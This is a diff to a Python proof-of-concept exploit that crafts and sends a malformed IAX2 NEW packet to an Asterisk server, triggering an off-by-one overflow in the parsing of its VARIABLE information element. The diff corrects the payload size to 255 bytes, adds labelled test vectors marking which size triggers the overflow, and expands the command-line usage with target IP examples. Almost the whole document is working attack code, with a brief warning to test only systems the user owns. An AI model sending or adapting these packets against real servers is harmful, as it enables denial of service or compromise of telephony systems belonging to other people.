@@ -85,28 +85,55 @@ def create_ie(ie_type, data):
     """
     Create an Information Element
     Format: [1 byte type][1 byte length][data]
+
+    NOTE: length field is only 1 byte (0-255 max)
     """
     if isinstance(data, str):
         data = data.encode('utf-8')
 
     length = len(data)
+
+    # Length field is 1 byte, max value is 255
+    if length > 255:
+        raise ValueError(f"IE data too long: {length} bytes (max 255)")
+
     return struct.pack('BB', ie_type, length) + data
 
 
-def create_malicious_variable_ie(overflow_size=260):
+def create_malicious_variable_ie(payload_size=255):
     """
     Create a malicious VARIABLE IE that triggers the buffer overflow
 
     The vulnerability: parser.c copies (len + 1) bytes into 256-byte buffer
-    Setting len to 256 or more causes overflow
+    - When len=255 (max for 1 byte), copies 256 bytes into 256-byte buffer
+    - Null terminator writes at position 256 (one past end)
+
+    Args:
+        payload_size: Size of VARIABLE IE data (max 255 due to IE format)
+                     Use 255 to trigger the boundary overflow condition
 
     Format of VARIABLE IE: "varname=value"
     """
-    # Create a payload that will overflow the 256-byte buffer
-    # We'll make it slightly over to clearly trigger the overflow
+    # IAX2 IE length field is only 1 byte (0-255 max)
+    if payload_size > 255:
+        print(f"[!] WARNING: IE length field is 1 byte (max 255)")
+        print(f"[!] Clamping payload_size from {payload_size} to 255")
+        payload_size = 255
+
+    # Create a payload of exactly the requested size
+    # Format: "AAAAAAAAAA=BBBBBBBB..." (varname=value)
     varname = "A" * 10
-    varvalue = "B" * (overflow_size - len(varname) - 1)  # -1 for '='
+    equals = "="
+    varvalue_len = payload_size - len(varname) - len(equals)
+
+    if varvalue_len < 0:
+        varvalue_len = 0
+
+    varvalue = "B" * varvalue_len
     payload = f"{varname}={varvalue}"
+
+    # Ensure exact size
+    payload = payload[:payload_size]
 
     return create_ie(IAX_IE_VARIABLE, payload)
 
@@ -126,16 +153,22 @@ def create_benign_ies():
     return ies
 
 
-def create_attack_packet(overflow_size=260, legitimate_looking=True):
+def create_attack_packet(payload_size=255, legitimate_looking=True):
     """
     Create a malicious IAX2 NEW packet with oversized VARIABLE IE
 
     Args:
-        overflow_size: Total size of VARIABLE IE payload (default 260 > 256)
+        payload_size: Size of VARIABLE IE payload (max 255, use 255 to trigger overflow)
         legitimate_looking: Add benign IEs to avoid obvious malformation
 
     Returns:
         bytes: Complete IAX2 packet ready to send
+
+    Note:
+        The overflow occurs when len=255 because:
+        - ast_copy_string(tmp, data+2, len+1) with len=255
+        - Becomes: ast_copy_string(tmp, data+2, 256)
+        - Copies 256 bytes into 256-byte buffer (boundary overflow)
     """
     # Craft the full frame header for IAX_COMMAND_NEW
     header = create_iax2_full_header(
@@ -156,7 +189,7 @@ def create_attack_packet(overflow_size=260, legitimate_looking=True):
         ies += create_benign_ies()
 
     # Add the malicious VARIABLE IE that triggers overflow
-    ies += create_malicious_variable_ie(overflow_size)
+    ies += create_malicious_variable_ie(payload_size)
 
     # Combine header and IEs
     packet = header + ies
@@ -164,22 +197,24 @@ def create_attack_packet(overflow_size=260, legitimate_looking=True):
     return packet
 
 
-def send_poc_packet(target_ip, target_port=IAX_DEFAULT_PORT, overflow_size=260):
+def send_poc_packet(target_ip, target_port=IAX_DEFAULT_PORT, payload_size=255):
     """
     Send the malicious packet to target Asterisk server
 
     Args:
         target_ip: IP address of target Asterisk server
         target_port: IAX2 port (default 4569)
-        overflow_size: Size of overflow (default 260 bytes > 256 buffer)
+        payload_size: Size of VARIABLE IE payload (max 255, use 255 for overflow)
     """
     print(f"[*] IAX2 VARIABLE IE Buffer Overflow POC")
     print(f"[*] Target: {target_ip}:{target_port}")
-    print(f"[*] Overflow size: {overflow_size} bytes (buffer is 256 bytes)")
+    print(f"[*] Payload size: {payload_size} bytes (will copy {payload_size + 1} into 256-byte buffer)")
+    if payload_size == 255:
+        print(f"[!] Using maximum IE length (255) - triggers boundary overflow!")
     print(f"[*] Creating malicious IAX2 packet...")
 
     # Create the malicious packet
-    packet = create_attack_packet(overflow_size=overflow_size)
+    packet = create_attack_packet(payload_size=payload_size)
 
     print(f"[*] Packet size: {len(packet)} bytes")
     print(f"[*] Packet structure:")
@@ -213,23 +248,28 @@ def send_poc_packet(target_ip, target_port=IAX_DEFAULT_PORT, overflow_size=260):
 
 
 def create_test_vectors():
-    """Generate multiple test cases with different overflow sizes"""
+    """Generate multiple test cases with different payload sizes"""
     test_cases = [
-        ("Boundary: exactly 256 bytes", 256),
-        ("Small overflow: 260 bytes", 260),
-        ("Medium overflow: 300 bytes", 300),
-        ("Large overflow: 512 bytes", 512),
-        ("Extreme overflow: 1024 bytes", 1024),
+        ("Safe: 100 bytes (no overflow)", 100),
+        ("Safe: 200 bytes (no overflow)", 200),
+        ("Boundary: 254 bytes (fills buffer, safe)", 254),
+        ("CRITICAL: 255 bytes (TRIGGERS OVERFLOW!)", 255),
     ]
 
     print("[*] Generating test vectors...\n")
+    print("Note: IE length field is 1 byte (max value 255)")
+    print("Vulnerability: ast_copy_string(tmp, data+2, len+1)")
+    print("When len=255: copies 256 bytes into 256-byte buffer\n")
 
     for description, size in test_cases:
-        packet = create_attack_packet(overflow_size=size, legitimate_looking=False)
+        packet = create_attack_packet(payload_size=size, legitimate_looking=False)
         print(f"{description}:")
-        print(f"  Payload size: {size} bytes")
+        print(f"  IE length field: {size}")
+        print(f"  Copy size: {size + 1} bytes")
+        print(f"  Buffer size: 256 bytes")
         print(f"  Total packet: {len(packet)} bytes")
-        print(f"  Overflow amount: {size - 255} bytes")
+        if size >= 255:
+            print(f"  >>> OVERFLOW: Writes null at position {size + 1}")
         print(f"  Hex (first 32 bytes): {packet[:32].hex()}")
         print()
 
@@ -280,13 +320,24 @@ def main():
         print("=" * 60)
         print()
         print("Usage:")
-        print(f"  {sys.argv[0]} <target_ip> [port] [overflow_size]")
+        print(f"  {sys.argv[0]} <target_ip> [port] [payload_size]")
         print()
-        print("Examples:")
-        print(f"  {sys.argv[0]} 192.168.1.100")
-        print(f"  {sys.argv[0]} 192.168.1.100 4569 260")
+        print("Arguments:")
+        print("  target_ip     : IP address of target Asterisk server")
+        print("  port          : IAX2 port (default: 4569)")
+        print("  payload_size  : VARIABLE IE payload size (max 255, default: 255)")
+        print()
+        print("Special Commands:")
         print(f"  {sys.argv[0]} analyze    # Show vulnerability analysis")
         print(f"  {sys.argv[0]} vectors    # Generate test vectors")
+        print()
+        print("Examples:")
+        print(f"  {sys.argv[0]} 192.168.1.100           # Use default (len=255)")
+        print(f"  {sys.argv[0]} 192.168.1.100 4569 255  # Explicit overflow size")
+        print(f"  {sys.argv[0]} 192.168.1.100 4569 254  # Boundary test (safe)")
+        print()
+        print("Note: Use payload_size=255 to trigger the overflow")
+        print("      (len=255 causes copy of 256 bytes into 256-byte buffer)")
         print()
         print("WARNING: Only test against systems you own/control!")
         print()
@@ -302,7 +353,13 @@ def main():
 
     target_ip = sys.argv[1]
     target_port = int(sys.argv[2]) if len(sys.argv) > 2 else IAX_DEFAULT_PORT
-    overflow_size = int(sys.argv[3]) if len(sys.argv) > 3 else 260
+    payload_size = int(sys.argv[3]) if len(sys.argv) > 3 else 255
+
+    # Clamp to valid range
+    if payload_size > 255:
+        print(f"[!] WARNING: IE length field is 1 byte (max 255)")
+        print(f"[!] Clamping payload_size from {payload_size} to 255")
+        payload_size = 255
 
     print()
     analyze_vulnerability()
@@ -313,7 +370,7 @@ def main():
         print("Aborted.")
         sys.exit(0)
 
-    send_poc_packet(target_ip, target_port, overflow_size)
+    send_poc_packet(target_ip, target_port, payload_size)
 
 
 if __name__ == "__main__":
